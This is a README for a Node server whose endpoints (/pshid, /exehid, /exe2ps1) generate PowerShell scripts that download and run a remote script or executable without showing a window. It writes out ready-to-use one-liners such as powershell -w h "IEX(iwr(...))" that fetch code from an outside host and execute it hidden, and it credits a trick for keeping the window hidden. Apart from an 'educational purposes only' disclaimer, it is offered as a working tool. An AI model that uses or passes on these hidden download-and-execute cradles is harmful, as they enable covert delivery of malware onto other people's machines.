This is a server which runs utils for various project

> **Disclaimer** \
> This project shall be used for **educational purposes only** \
> I (the author) take no responsibility or liability related to its usage.
> Any illegal activities are strictly forbidden.

# Endpoints

## [/pshid](https://vercelutilsserver.gymthun.com/exehid)

returns a powershell script, downloads and executes a powershell script without a window


example: [`/pshid?url=is.gd/tuioh`](https://vercelutilsserver.gymthun.com/pshid?url=is.gd%2Ftuioh)

which can be executed with 
```shell
powershell -w h "IEX(iwr('https://vercelutilsserver.gymthun.com/pshid?url=is.gd%2Ftuioh'))"
```

## [/exehid](https://vercelutilsserver.gymthun.com/exe2ps1)

downloads and runs an executable via pshid


example: [`/exehid?url=https://www.python.org/ftp/python/3.12.4/python-3.12.4.exe`](https://vercelutilsserver.gymthun.com/exehid?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe)

which can be executed with 
```shell
powershell -w h "IEX(iwr('https://vercelutilsserver.gymthun.com/exehid?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe'))"
```

## [/exe2ps1](https://vercelutilsserver.gymthun.com/exe2ps1)

<details>
<summary>Details</summary>

returns a powershell script, which downloads and runs an executable from `param:url` with all `param:arg` passed


example: [`/exe2ps1?url=https://www.python.org/ftp/python/3.12.4/python-3.12.4.exe`](https://vercelutilsserver.gymthun.com/exe2ps1?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe)

which can be executed with 
```shell
powershell -w h "IEX(iwr('https://vercelutilsserver.gymthun.com/exe2ps1?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe'))"
```
</details>

# Building
assumes having NodeJS and git-cli installed

### clone this repo
```shell
git clone https://github.com/kaliiiiiiiiii/vercel_utils_server
cd vercel_utils_server
```

### install packages
```shell
npm install
```

### run development server
```shell
npm run dev
```


# Acknowledgments
Inspiration, code snippets, etc.

- [`WindowStyle -Hidden` not being respected workaround](https://github.com/microsoft/terminal/issues/12464#issuecomment-1499119834)
